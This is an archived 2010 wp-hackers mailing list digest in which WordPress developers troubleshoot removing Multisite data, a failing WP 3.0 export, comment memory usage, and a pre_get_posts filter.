> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ashishsainiashfame at gmail.com  Wed Jul 21 03:59:14 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Wed, 21 Jul 2010 09:29:14 +0530
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
	<AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com>
Message-ID: <AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com>

Can anyone tell me how do I actually remove the Multisite data from my
installation?

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Mon, Jul 19, 2010 at 9:59 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Hi Brian,
>
> I am fixing up a client's site where Multisite refused to work for some
> reason. I am not sure whats stuck where.
>
> I am looking for a way by which I can revert the installation back i.e. the
> things Multisite feature may have added.
>
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter : http://twitter.com/ashfame
>
>
> On Mon, Jul 19, 2010 at 9:44 PM, Brian Layman <bulk at thecodecave.com>wrote:
>
>> When are you getting this error?  Are you trying to convert the site back
>> to
>> multisite again or are you running the install process again? That error
>> should only occur during initial wp/network setup..
>>
>> ______________________________________________
>> Brian Layman
>> eHermits, Inc.
>> TheCodeCave.com / eHermitsInc.com / twitter.com/BrianLayman /
>> facebook.com/eHermit
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From aaron at jorb.in  Wed Jul 21 04:03:53 2010
From: aaron at jorb.in (Aaron Jorbin)
Date: Wed, 21 Jul 2010 00:03:53 -0400
Subject: [wp-hackers] WP3.0 : export doesn't works!
In-Reply-To: <AANLkTiki_MHpGEk7be0T4cgbWROmUBVEU67RD2J-EYDb@mail.gmail.com>
References: <AANLkTimyVZ5Y0K4x653kS1miVoWSq8ZOGglXEqDSQcAb@mail.gmail.com> 
	<AANLkTikzHasMxx068NTF7LLQiQQyXa6Qck4dLQ1pq2x9@mail.gmail.com> 
	<AANLkTiki_MHpGEk7be0T4cgbWROmUBVEU67RD2J-EYDb@mail.gmail.com>
Message-ID: <AANLkTilWTu5F12chBj3LV0RsUF5guIyFg3gy6ArCbTLZ@mail.gmail.com>

you might want to try using the fixed exporter (you can download it from
http://core.trac.wordpress.org/browser/branches/3.0/wp-admin/includes/export.php?rev=15368
)
and see if that fixes it on the host you are having issues with.

http://aaron.jorb.in
twitter: twitter.com/aaronjorbin


On Tue, Jul 20, 2010 at 11:55 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:

> ok, thank u.
> it happens only on some hosting.
> Kalyhost : KO
> OVH : OK
>
> --
> Jimmy | www.jimmyroy.fr
> --
>
>
>
> 2010/7/21 Aaron Jorbin <aaron at jorb.in>
>
> > It's a known issue that has been patched in the upcoming 3.0.1.
> >
> > Tickets:
> > http://core.trac.wordpress.org/ticket/14026
> > http://core.trac.wordpress.org/ticket/14213
> >
> > http://aaron.jorb.in
> > twitter: twitter.com/aaronjorbin
> >
> >
> > On Tue, Jul 20, 2010 at 11:42 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
> >
> > > hi all,
> > > today I try to export my WP data using the export page, I click on the
> > > "download export file" button and it doesn't save the xml file... the
> > file
> > > is directly open in the same windows, I run it under Google Chrome for
> > Mac
> > > OS X and Firefox.
> > >
> > > I got these error messages:
> > >
> > > Warning: strip_tags() expects parameter 1 to be string, array given in
> > > /www/mydomainname/www/wp-includes/formatting.php on line 2773
> > >
> > > Warning: Cannot modify header information - headers already sent by
> > (output
> > > started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> > > /www/mydomainname/www/wp-admin/includes/export.php on line 44
> > >
> > > Warning: Cannot modify header information - headers already sent by
> > (output
> > > started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> > > /www/mydomainname/www/wp-admin/includes/export.php on line 45
> > >
> > > Warning: Cannot modify header information - headers already sent by
> > (output
> > > started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> > > /www/mydomainname/www/wp-admin/includes/export.php on line 46
> > >
> > >
> > > I also try on another WP3.0 site and it works fine.
> > > --
> > > Jimmy | www.jimmyroy.fr
> > > --
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From aaron at jorb.in  Wed Jul 21 04:05:34 2010
From: aaron at jorb.in (Aaron Jorbin)
Date: Wed, 21 Jul 2010 00:05:34 -0400
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
	<AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com> 
	<AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com>
Message-ID: <AANLkTimsxKdaFX6T0e1S3D22Vmgx3fZbz7IscyXX1mDn@mail.gmail.com>

The easiest way is probably to revert to the backup you made before you
upgraded.

http://aaron.jorb.in
twitter: twitter.com/aaronjorbin


On Tue, Jul 20, 2010 at 11:59 PM, Ashish Saini <ashishsainiashfame at gmail.com
> wrote:

> Can anyone tell me how do I actually remove the Multisite data from my
> installation?
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> On Mon, Jul 19, 2010 at 9:59 PM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > Hi Brian,
> >
> > I am fixing up a client's site where Multisite refused to work for some
> > reason. I am not sure whats stuck where.
> >
> > I am looking for a way by which I can revert the installation back i.e.
> the
> > things Multisite feature may have added.
> >
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter : http://twitter.com/ashfame
> >
> >
> > On Mon, Jul 19, 2010 at 9:44 PM, Brian Layman <bulk at thecodecave.com
> >wrote:
> >
> >> When are you getting this error?  Are you trying to convert the site
> back
> >> to
> >> multisite again or are you running the install process again? That error
> >> should only occur during initial wp/network setup..
> >>
> >> ______________________________________________
> >> Brian Layman
> >> eHermits, Inc.
> >> TheCodeCave.com / eHermitsInc.com / twitter.com/BrianLayman /
> >> facebook.com/eHermit
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ashishsainiashfame at gmail.com  Wed Jul 21 04:08:55 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Wed, 21 Jul 2010 09:38:55 +0530
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <AANLkTimsxKdaFX6T0e1S3D22Vmgx3fZbz7IscyXX1mDn@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
	<AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com> 
	<AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com> 
	<AANLkTimsxKdaFX6T0e1S3D22Vmgx3fZbz7IscyXX1mDn@mail.gmail.com>
Message-ID: <AANLkTimNDegMbTL1FPN50hT0WRnPivZN59Osinv6WWTd@mail.gmail.com>

Any other way of doing this? I will take a look if my client has a backup.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Wed, Jul 21, 2010 at 9:35 AM, Aaron Jorbin <aaron at jorb.in> wrote:

> The easiest way is probably to revert to the backup you made before you
> upgraded.
>
> http://aaron.jorb.in
> twitter: twitter.com/aaronjorbin
>
>
> On Tue, Jul 20, 2010 at 11:59 PM, Ashish Saini <
> ashishsainiashfame at gmail.com
> > wrote:
>
> > Can anyone tell me how do I actually remove the Multisite data from my
> > installation?
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter
> > : http://twitter.com/ashfame
> >
> >
> > On Mon, Jul 19, 2010 at 9:59 PM, Ashish Saini
> > <ashishsainiashfame at gmail.com>wrote:
> >
> > > Hi Brian,
> > >
> > > I am fixing up a client's site where Multisite refused to work for some
> > > reason. I am not sure whats stuck where.
> > >
> > > I am looking for a way by which I can revert the installation back i.e.
> > the
> > > things Multisite feature may have added.
> > >
> > >
> > > Thanks & Regards
> > > Ashish Saini aka Ashfame
> > > (Deserve Before You Desire)
> > > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > > Twitter : http://twitter.com/ashfame
> > >
> > >
> > > On Mon, Jul 19, 2010 at 9:44 PM, Brian Layman <bulk at thecodecave.com
> > >wrote:
> > >
> > >> When are you getting this error?  Are you trying to convert the site
> > back
> > >> to
> > >> multisite again or are you running the install process again? That
> error
> > >> should only occur during initial wp/network setup..
> > >>
> > >> ______________________________________________
> > >> Brian Layman
> > >> eHermits, Inc.
> > >> TheCodeCave.com / eHermitsInc.com / twitter.com/BrianLayman /
> > >> facebook.com/eHermit
> > >>
> > >> _______________________________________________
> > >> wp-hackers mailing list
> > >> wp-hackers at lists.automattic.com
> > >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >>
> > >
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Wed Jul 21 04:17:13 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 21 Jul 2010 00:17:13 -0400
Subject: [wp-hackers] WP3.0 : export doesn't works!
In-Reply-To: <AANLkTiki_MHpGEk7be0T4cgbWROmUBVEU67RD2J-EYDb@mail.gmail.com>
References: <AANLkTimyVZ5Y0K4x653kS1miVoWSq8ZOGglXEqDSQcAb@mail.gmail.com> 
	<AANLkTikzHasMxx068NTF7LLQiQQyXa6Qck4dLQ1pq2x9@mail.gmail.com> 
	<AANLkTiki_MHpGEk7be0T4cgbWROmUBVEU67RD2J-EYDb@mail.gmail.com>
Message-ID: <AANLkTikaY67TI9X9zvAZJne7jBx-E4ymxbsn846zODA2@mail.gmail.com>

On Tue, Jul 20, 2010 at 11:55 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:

> ok, thank u.
> it happens only on some hosting.
> Kalyhost : KO
> OVH : OK


It all depends on the setup. If display_errors is off (as it should be on
any production environment), then the export will work. If display_errors is
on, then it seems some servers stuff the warnings inside the export file
(which WordPress will read fine, if you're going from WP to WP), while other
servers will not send the headers for the export file and thus no file will
be generated.

As Aaron said, it'll be fixed in 3.0.1, which should be coming soon.

From william.canino at googlemail.com  Wed Jul 21 04:26:09 2010
From: william.canino at googlemail.com (William Canino)
Date: Wed, 21 Jul 2010 00:26:09 -0400
Subject: [wp-hackers] Memory spike in comments_template()
In-Reply-To: <AANLkTimByyQZsxBCOr-NDOWYjEuSAM7aPJ0vBGVM4tOp@mail.gmail.com>
References: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>
	<AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com>
	<AANLkTind79h-rV9sJb3bJnkO0CKjr0Cr8493F5Q_fdGt@mail.gmail.com>
	<AANLkTim1jNrhP-DFK3ol4SM688UryGJTAWaEfdBleSrG@mail.gmail.com>
	<EDCA28A7-69BC-4C3A-8C39-263FB8C742A0@ftwr.co.uk>
	<AANLkTimmUXvSBErhnUslVesjcLwvmJGS7lRMXmAj6-jG@mail.gmail.com>
	<AANLkTimByyQZsxBCOr-NDOWYjEuSAM7aPJ0vBGVM4tOp@mail.gmail.com>
Message-ID: <AANLkTilghRlbnRtA4tf1Ds0PwJ9cISfMKUsFIa1peRl8@mail.gmail.com>

Thank you to those who will work on this.

I came across a wordpress.com-hosted post today with 20,500 comments,
... and it's threaded.
http://stuffwhitepeoplelike.com/2008/01/20/11-asian-girls/ .  I can't
imagine how much memory that post eats.

W

On 10/07/2010, Baki Goxhaj <banago at gmail.com> wrote:
> Comments will need enhancement for sure, especially now that bbPress is
> becoming a plugin that will use custom post types. This means comments will
> need eventually to scale very well and behave nicely in BB mode.
>
> Baki Goxhaj
> www.wplancer.com | www.banago.info | www.lintuts.com
>
>
> On 10 July 2010 07:25, Otto <otto at ottodestruct.com> wrote:
>
>> Agreed, and also there's that line of code in comments_template that's
>> been bugging me for a long time:
>>
>> /** @todo Use API instead of SELECTs. */
>>
>> Admittedly, I understand why this hasn't been done (it's a lot of
>> work), but it does seem like a valid reason to have a ticket in trac
>> for it.
>>
>> -Otto
>>
>>
>>
>> On Sat, Jul 10, 2010 at 12:21 AM, Peter Westwood
>> <peter.westwood at ftwr.co.uk> wrote:
>> > William,
>> >
>> > Please reopen that ticket and put as much detail on the problem as you
>> have discovered.
>> >
>> > I don't see that the reason for closure on there is necessarily valid -
>> we should try and see if we can improve this as.
>> >
>> > As you rightly suggest we should be able to scale nicely when there are
>> alot of comments on a post.
>> >
>> > --
>> > Peter Westwood
>> > http://peter.westwood.name
>> >
>> > On 10 Jul 2010, at 05:30, William Canino <william.canino at googlemail.com>
>> wrote:
>> >
>> >>> I will have to therefore write my own comments_template()....
>> >>
>> >> ... Writing this turns out to be a complicated mod because the various
>> >> comment helper functions and callbacks presume that $comments has all
>> >> the comments. :-(
>> >>
>> >> ----> Well, this means while WordPress is not a blog anymore per se,
>> >> WordPress is NOT a discussion forum either, because WordPress doesn't
>> >> scale when it has a plethora of comments.
>> >>
>> >> In the meantime, the palliative that lowered the memory usage by 3MB
>> >> is by commenting out "update_comment_cache($wp_query->comments);"
>> >>
>> >>
>> >>
>> >>
>> >>
>> >> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
>> >>> (I should add that I have threading off.)
>> >>>
>> >>> Denis-de-Bernardy has declared the issue as wont-fix :-(
>> >>>
>> >>> https://core.trac.wordpress.org/ticket/8071
>> >>>
>> >>> I will have to therefore write my own comments_template()....  Does
>> >>> anyone have an alternative solution?
>> >>>
>> >>> W
>> >>>
>> >>>
>> >>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>> >>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>> >>>> <william.canino at googlemail.com> wrote:
>> >>>>> <!-- BEFORE: 25033360 -->
>> >>>>> <!-- START: 33953448 -->
>> >>>>> ... (comments go here) ...
>> >>>>> <!-- END: 36172480 -->
>> >>>>> <!-- AFTER: 36113680 -->
>> >>>>>
>> >>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>> >>>>>
>> >>>>> Do I really have to move out some of the older comments of this blog
>> >>>>> post?  Is there another solution?
>> >>>>
>> >>>> Comments don't get pulled out of the database until the
>> >>>> comments_template function is called, so that basically means you've
>> >>>> got 8+ meg of comments on the post in question.
>> >>>>
>> >>>>
>> >>>> -Otto
>> >>>> _______________________________________________
>> >>>> wp-hackers mailing list
>> >>>> wp-hackers at lists.automattic.com
>> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>
>> >>>
>> >>
>> >>
>> >> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
>> >>> (I should add that I have threading off.)
>> >>>
>> >>> Denis-de-Bernardy has declared the issue as wont-fix :-(
>> >>>
>> >>> https://core.trac.wordpress.org/ticket/8071
>> >>>
>> >>> I will have to therefore write my own comments_template()....  Does
>> >>> anyone have an alternative solution?
>> >>>
>> >>> W
>> >>>
>> >>>
>> >>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>> >>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>> >>>> <william.canino at googlemail.com> wrote:
>> >>>>> <!-- BEFORE: 25033360 -->
>> >>>>> <!-- START: 33953448 -->
>> >>>>> ... (comments go here) ...
>> >>>>> <!-- END: 36172480 -->
>> >>>>> <!-- AFTER: 36113680 -->
>> >>>>>
>> >>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>> >>>>>
>> >>>>> Do I really have to move out some of the older comments of this blog
>> >>>>> post?  Is there another solution?
>> >>>>
>> >>>> Comments don't get pulled out of the database until the
>> >>>> comments_template function is called, so that basically means you've
>> >>>> got 8+ meg of comments on the post in question.
>> >>>>
>> >>>>
>> >>>> -Otto
>> >>>> _______________________________________________
>> >>>> wp-hackers mailing list
>> >>>> wp-hackers at lists.automattic.com
>> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>
>> >>>
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Wed Jul 21 04:29:46 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Wed, 21 Jul 2010 12:29:46 +0800
Subject: [wp-hackers] WP3.0 : export doesn't works!
In-Reply-To: <AANLkTikaY67TI9X9zvAZJne7jBx-E4ymxbsn846zODA2@mail.gmail.com>
References: <AANLkTimyVZ5Y0K4x653kS1miVoWSq8ZOGglXEqDSQcAb@mail.gmail.com>
	<AANLkTikzHasMxx068NTF7LLQiQQyXa6Qck4dLQ1pq2x9@mail.gmail.com>
	<AANLkTiki_MHpGEk7be0T4cgbWROmUBVEU67RD2J-EYDb@mail.gmail.com>
	<AANLkTikaY67TI9X9zvAZJne7jBx-E4ymxbsn846zODA2@mail.gmail.com>
Message-ID: <AANLkTim6y1aO4GAARwG7TtisjutWS3c74krByFPlVLuv@mail.gmail.com>

I fix the warning message and it works now :

change
        $string = strip_tags($string);
by
        $string = strip_tags((string)$string);

--
Jimmy | www.jimmyroy.fr
--



2010/7/21 Andrew Nacin <wp at andrewnacin.com>

> On Tue, Jul 20, 2010 at 11:55 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
>
> > ok, thank u.
> > it happens only on some hosting.
> > Kalyhost : KO
> > OVH : OK
>
>
> It all depends on the setup. If display_errors is off (as it should be on
> any production environment), then the export will work. If display_errors
> is
> on, then it seems some servers stuff the warnings inside the export file
> (which WordPress will read fine, if you're going from WP to WP), while
> other
> servers will not send the headers for the export file and thus no file will
> be generated.
>
> As Aaron said, it'll be fixed in 3.0.1, which should be coming soon.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Wed Jul 21 04:32:48 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 21 Jul 2010 00:32:48 -0400
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <AANLkTimNDegMbTL1FPN50hT0WRnPivZN59Osinv6WWTd@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
	<AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com> 
	<AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com> 
	<AANLkTimsxKdaFX6T0e1S3D22Vmgx3fZbz7IscyXX1mDn@mail.gmail.com> 
	<AANLkTimNDegMbTL1FPN50hT0WRnPivZN59Osinv6WWTd@mail.gmail.com>
Message-ID: <AANLkTin-XSPR88QyLSobcU88Fm5X5mtaDIS7bbCbCSSX@mail.gmail.com>

On Wed, Jul 21, 2010 at 12:08 AM, Ashish Saini <ashishsainiashfame at gmail.com
> wrote:

> Any other way of doing this? I will take a look if my client has a backup.


You didn't answer Brian's question of "when" (or where) you are seeing this
error. I believe it only appears on Tools > Network. Simple solution is to
remove the WP_ALLOW_MULTISITE constant to hide that panel.

1. Remove the constants.
2. Remove the multisite tables. (You probably missed one.)
3. Remove the two fields added to the users table that are multisite-only.
4. Revert to the standard .htaccess, or delete it and allow WP to regenerate
it by visiting Settings > Permalink.
5. Follow http://codex.wordpress.org/Create_A_Network, or hire a consultant
to follow it.

From angelia at 10sexyapples.com  Wed Jul 21 04:57:50 2010
From: angelia at 10sexyapples.com (Angelia Baladon)
Date: Tue, 20 Jul 2010 21:57:50 -0700
Subject: [wp-hackers] pre_get_posts problem
Message-ID: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>

Howdy all,

I'm running a pre_get_posts filter on is_author() in order to include my
custom post types when author.php is called.

If I don't include nav_menu_item in the query set, the primary menu (
basically the default twenty ten nav ) disappears. This makes sense.

But, if I DO include nav_menu_item in the query set, I get nav_menu_item/s
listed in the loop.

I could have a bug related to some of my attempts to get the link object
type, but, wanted to know if anyone else has experienced this before I wipe
the database.

If anyone is using the new navigation and could confirm if it's just me
that'd be swell:

add_filter( 'pre_get_posts', 'custom_posts' );

function custom_posts( $query ) {

    if ( is_author() )
        $query->set( 'post_type', array( 'post', 'nav_menu_item', 'lesson',
'howto', 'workshop', 'attachment' ) );

    return $query;
}

replace my custom post types with yours and check your author page.

Over and out~
Angie

From wp at andrewnacin.com  Wed Jul 21 05:14:43 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 21 Jul 2010 01:14:43 -0400
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
Message-ID: <AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>

On Wed, Jul 21, 2010 at 12:57 AM, Angelia Baladon
<angelia at 10sexyapples.com>wrote:

> Howdy all,
>
> I'm running a pre_get_posts filter on is_author() in order to include my
> custom post types when author.php is called.
>
> If I don't include nav_menu_item in the query set, the primary menu (
> basically the default twenty ten nav ) disappears. This makes sense.
>
> But, if I DO include nav_menu_item in the query set, I get nav_menu_item/s
> listed in the loop.
>
> I could have a bug related to some of my attempts to get the link object
> type, but, wanted to know if anyone else has experienced this before I wipe
> the database.
>
> If anyone is using the new navigation and could confirm if it's just me
> that'd be swell:
>
> add_filter( 'pre_get_posts', 'custom_posts' );
>
> function custom_posts( $query ) {
>
>    if ( is_author() )
>        $query->set( 'post_type', array( 'post', 'nav_menu_item', 'lesson',
> 'howto', 'workshop', 'attachment' ) );
>
>    return $query;
> }
>
> replace my custom post types with yours and check your author page.
>

This is one of the dangers/pitfalls of using pre_get_posts. It seems to be
recommended often for some reason when dealing with custom post types, but
it is much better to modify the request itself, versus any old get_posts or
WP_Query call.

The correct filter here would be either 'request' (direct QV access) or
parse_request (whole WP object to play with).

From ashishsainiashfame at gmail.com  Wed Jul 21 07:12:59 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Wed, 21 Jul 2010 12:42:59 +0530
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <AANLkTin-XSPR88QyLSobcU88Fm5X5mtaDIS7bbCbCSSX@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
	<AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com> 
	<AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com> 
	<AANLkTimsxKdaFX6T0e1S3D22Vmgx3fZbz7IscyXX1mDn@mail.gmail.com> 
	<AANLkTimNDegMbTL1FPN50hT0WRnPivZN59Osinv6WWTd@mail.gmail.com> 
	<AANLkTin-XSPR88QyLSobcU88Fm5X5mtaDIS7bbCbCSSX@mail.gmail.com>
Message-ID: <AANLkTinWkf7b6Yrd4SytovFh4tgMiameO0mnIIvlnO0n@mail.gmail.com>

Hi Andrew,

I am sorry I missed Brian's question somehow. Yes. its on Tools > Network
screen only.

I have removed all the lines added to wp-config.php and .htaccess
I think its because of something residing in the database only.
I have removed the following tables : -
`wp_bdir_cats`, `wp_bdir_listings`, `wp_bdir_options`, `wp_bdir_sub_cat`,
`wp_blog_versions`, `wp_blogs`

I can't see any other table related to Multisite. Is there any other?

And what are those two files added to the users table? I can just see 4
users. I tried removing all the users except admin but that did nothing. Am
I looking at the right place? There is nothing related to the options table
too.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Wed, Jul 21, 2010 at 10:02 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Wed, Jul 21, 2010 at 12:08 AM, Ashish Saini <
> ashishsainiashfame at gmail.com
> > wrote:
>
> > Any other way of doing this? I will take a look if my client has a
> backup.
>
>
> You didn't answer Brian's question of "when" (or where) you are seeing this
> error. I believe it only appears on Tools > Network. Simple solution is to
> remove the WP_ALLOW_MULTISITE constant to hide that panel.
>
> 1. Remove the constants.
> 2. Remove the multisite tables. (You probably missed one.)
> 3. Remove the two fields added to the users table that are multisite-only.
> 4. Revert to the standard .htaccess, or delete it and allow WP to
> regenerate
> it by visiting Settings > Permalink.
> 5. Follow http://codex.wordpress.org/Create_A_Network, or hire a
> consultant
> to follow it.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Wed Jul 21 07:21:59 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 21 Jul 2010 03:21:59 -0400
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <AANLkTinWkf7b6Yrd4SytovFh4tgMiameO0mnIIvlnO0n@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
	<AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com> 
	<AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com> 
	<AANLkTimsxKdaFX6T0e1S3D22Vmgx3fZbz7IscyXX1mDn@mail.gmail.com> 
	<AANLkTimNDegMbTL1FPN50hT0WRnPivZN59Osinv6WWTd@mail.gmail.com> 
	<AANLkTin-XSPR88QyLSobcU88Fm5X5mtaDIS7bbCbCSSX@mail.gmail.com> 
	<AANLkTinWkf7b6Yrd4SytovFh4tgMiameO0mnIIvlnO0n@mail.gmail.com>
Message-ID: <AANLkTiljk-01mMkhfY5lYPo7sZd7c6I65P0kYAnTuo1v@mail.gmail.com>

On Wed, Jul 21, 2010 at 3:12 AM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> I can't see any other table related to Multisite. Is there any other?
>
> Yes .. Specifically, one the Tools > Network screen checks for, which is
wp_site. Some of the ones you mentioned are plugin tables or tables from
another install with a separate prefix. Multisite has six tables: blogs,
blog_versions, registration_log, site, sitemeta, signups. Additionally,
sitecategories, if you have global terms enabled.


> And what are those two files added to the users table? I can just see 4
> users. I tried removing all the users except admin but that did nothing. Am
> I looking at the right place? There is nothing related to the options table
> too.


Fields, not files/records -- the "deleted" and "spam" fields.

From ashishsainiashfame at gmail.com  Wed Jul 21 07:34:45 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Wed, 21 Jul 2010 13:04:45 +0530
Subject: [wp-hackers] Removing WordPress Multisite data
